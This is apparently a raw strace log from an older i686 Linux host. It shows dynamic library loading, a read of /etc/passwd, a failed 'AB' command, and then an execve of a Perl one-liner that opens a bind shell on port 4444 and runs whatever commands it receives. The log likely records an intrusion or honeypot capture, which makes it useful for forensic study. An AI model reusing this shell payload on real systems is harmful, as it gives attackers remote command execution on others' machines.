\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
10102 20:03:02.880005 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
10102 20:03:02.880023 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e47000
10102 20:03:02.880035 mmap2(0xb7e4e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e4e000
10102 20:03:02.880056 close(1)          = 0
10102 20:03:02.880069 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.880083 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
10102 20:03:02.880097 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
10102 20:03:02.880185 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
10102 20:03:02.880208 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e2f000
10102 20:03:02.880220 mmap2(0xb7e43000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e43000
10102 20:03:02.880236 mmap2(0xb7e45000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e45000
10102 20:03:02.880252 close(1)          = 0
10102 20:03:02.880279 munmap(0xb7fd5000, 29913) = 0
10102 20:03:02.880297 open("/etc/ld.so.cache", O_RDONLY) = 1
10102 20:03:02.880310 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10102 20:03:02.880327 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd5000
10102 20:03:02.880337 close(1)          = 0
10102 20:03:02.880347 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.880362 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
10102 20:03:02.880400 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10102 20:03:02.880523 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
10102 20:03:02.880541 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e25000
10102 20:03:02.880552 mmap2(0xb7e2d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e2d000
10102 20:03:02.880572 close(1)          = 0
10102 20:03:02.880585 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10102 20:03:02.880599 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
10102 20:03:02.880613 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10102 20:03:02.880703 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10102 20:03:02.880720 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e1a000
10102 20:03:02.880732 mmap2(0xb7e23000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e23000
10102 20:03:02.880752 close(1)          = 0
10102 20:03:02.880779 munmap(0xb7fd5000, 29913) = 0
10102 20:03:02.880797 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
10102 20:03:02.880812 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10102 20:03:02.880824 _llseek(1, 0, [0], SEEK_CUR) = 0
10102 20:03:02.880836 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
10102 20:03:02.880868 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fdc000
10102 20:03:02.880939 _llseek(1, 1624, [1624], SEEK_SET) = 0
10102 20:03:02.880972 munmap(0xb7fdc000, 1624) = 0
10102 20:03:02.880982 close(1)          = 0
10102 20:03:02.881014 getpgrp()         = 3831
10102 20:03:02.881025 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
10102 20:03:02.881054 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
10102 20:03:02.881070 brk(0x8101000)    = 0x8101000
10102 20:03:02.881106 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.881121 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.881136 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10102 20:03:02.881174 brk(0x8102000)    = 0x8102000
10102 20:03:02.881206 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10102 20:03:02.881225 stat64("/sbin/AB", 0xbfcabb08) = -1 ENOENT (No such file or directory)
10102 20:03:02.881237 stat64("/bin/AB", 0xbfcabb08) = -1 ENOENT (No such file or directory)
10102 20:03:02.881249 stat64("/usr/sbin/AB", 0xbfcabb08) = -1 ENOENT (No such file or directory)
10102 20:03:02.881261 stat64("/usr/bin/AB", 0xbfcabb08) = -1 ENOENT (No such file or directory)
10102 20:03:02.881275 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10102 20:03:02.881290 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e506f8) = 10103
10103 20:03:02.881350 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10103 20:03:02.881368 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10103 20:03:02.881422 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10103 20:03:02.881435 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10103 20:03:02.881454 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10103 20:03:02.881471 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10103 20:03:02.881485 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10103 20:03:02.881560 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
10103 20:03:02.881575 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10103 20:03:02.881653 exit_group(127)   = ?
10102 20:03:02.956889 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  20:03:02.956918 waitpid(10102,  <unfinished ...>
10102 20:03:02.956943 <... rt_sigprocmask resumed> NULL, 8) = 0
10102 20:03:03.026938 --- SIGCHLD (Child exited) @ 0 (0) ---
10102 20:03:03.026938 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 10103
10102 20:03:03.026955 waitpid(-1, 0xbfcab788, WNOHANG) = -1 ECHILD (No child processes)
10102 20:03:03.026967 sigreturn()       = ? (mask now [])
10102 20:03:03.026994 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10102 20:03:03.027010 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10102 20:03:03.027022 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10102 20:03:03.027034 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10102 20:03:03.027054 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10102 20:03:03.027066 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10102 20:03:03.027103 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10102 20:03:03.027125 stat64("/sbin/perl", 0xbfcabb38) = -1 ENOENT (No such file or directory)
10102 20:03:03.027137 stat64("/bin/perl", 0xbfcabb38) = -1 ENOENT (No such file or directory)
10102 20:03:03.027149 stat64("/usr/sbin/perl", 0xbfcabb38) = -1 ENOENT (No such file or directory)
10102 20:03:03.027161 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10102 20:03:03.027180 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10102 20:03:03.027205 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10102 20:03:03.027221 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e506f8) = 10104
10104 20:03:03.106941 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10104 20:03:03.106982 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10104 20:03:03.106998 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10104 20:03:03.107010 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10104 20:03:03.107026 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10104 20:03:03.107042 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10104 20:03:03.107055 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10104 20:03:03.107095 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
10104 20:03:03.107197 brk(0)            = 0x8153000
10104 20:03:03.107218 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.107236 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f92000
10104 20:03:03.107253 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.107271 open("/etc/ld.so.cache", O_RDONLY) = 1
10104 20:03:03.107284 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10104 20:03:03.107303 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f8a000
10104 20:03:03.107314 close(1)          = 0
10104 20:03:03.107325 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.107341 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10104 20:03:03.107385 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10104 20:03:03.107510 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10104 20:03:03.107528 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f86000
10104 20:03:03.107541 mmap2(0xb7f88000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f88000
10104 20:03:03.107558 close(1)          = 0
10104 20:03:03.107570 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.107584 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
10104 20:03:03.107599 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
10104 20:03:03.107695 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
10104 20:03:03.107712 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f61000
10104 20:03:03.107724 mmap2(0xb7f84000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f84000
10104 20:03:03.107740 close(1)          = 0
10104 20:03:03.107752 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.107766 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
10104 20:03:03.107780 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
10104 20:03:03.107915 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
10104 20:03:03.107933 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f60000
10104 20:03:03.107947 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f48000
10104 20:03:03.107958 mmap2(0xb7f5c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f5c000
10104 20:03:03.107987 mmap2(0xb7f5e000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f5e000
10104 20:03:03.108002 close(1)          = 0
10104 20:03:03.108014 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.108027 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10104 20:03:03.108042 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10104 20:03:03.108141 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10104 20:03:03.108164 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7df9000
10104 20:03:03.108176 mmap2(0xb7f42000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f42000
10104 20:03:03.108191 mmap2(0xb7f45000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f45000
10104 20:03:03.108204 close(1)          = 0
10104 20:03:03.108217 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10104 20:03:03.108231 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
10104 20:03:03.108245 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 